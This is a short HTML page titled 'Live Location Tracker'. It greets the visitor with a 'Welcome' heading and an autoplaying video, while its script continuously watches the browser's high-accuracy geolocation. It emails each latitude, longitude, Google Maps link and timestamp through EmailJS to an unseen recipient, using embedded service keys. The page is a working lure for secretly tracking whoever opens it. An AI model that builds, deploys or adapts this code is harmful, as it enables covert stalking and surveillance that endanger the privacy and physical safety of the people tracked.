<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<meta name="viewport"
content="width=device-width, initial-scale=1.0">

<title>Live Location Tracker</title>

<!-- EMAILJS -->
<script type="text/javascript"
src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
</script>

<script>
(function(){

emailjs.init("5YzzNNDMEURwMI8HB");

})();
</script>

<style>

body{
margin:0;
padding:0;
background:#111;
color:white;
font-family:Arial;
text-align:center;
}

.container{
padding:40px;
}

video{
width:80%;
max-width:900px;
border-radius:12px;
margin-top:20px;
box-shadow:0 0 20px rgba(255,255,255,0.2);
}

#status{
margin-top:20px;
font-size:20px;
color:#00ff88;
}

</style>

</head>

<body>

<div class="container">

<h1>Welcome</h1>

<!-- VIDEO -->
<video controls autoplay muted loop>
<source src="your-video.mp4" type="video/mp4">
</video>

<div id="status">
Starting live tracking...
</div>

</div>

<script>

const statusText =
document.getElementById("status");

function sendLocation(latitude, longitude){

const templateParams = {

message:
"LIVE LOCATION UPDATE\n\n" +

"Latitude: " + latitude +

"\n\nLongitude: " + longitude +

"\n\nGoogle Maps:\nhttps://www.google.com/maps?q=" +
latitude + "," + longitude +

"\n\nTime:\n" +
new Date().toLocaleString()

};

emailjs.send(
"service_hf7zca6",
"template_km4w7nd",
templateParams
)

.then(function(response){

console.log("LIVE LOCATION SENT", response);

statusText.innerHTML =
"Live location sending...";

})

.catch(function(error){

console.log("FAILED", error);

statusText.innerHTML =
"Failed to send location.";

});

}

if(navigator.geolocation){

navigator.geolocation.watchPosition(

function(position){

const latitude =
position.coords.latitude;

const longitude =
position.coords.longitude;

console.log(latitude, longitude);

sendLocation(latitude, longitude);

},

function(error){

console.log(error);

statusText.innerHTML =
"Location permission denied.";

},

{

enableHighAccuracy:true,
maximumAge:0,
timeout:5000

}

);

}else{

statusText.innerHTML =
"Geolocation not supported.";

}

</script>

</body>
</html>
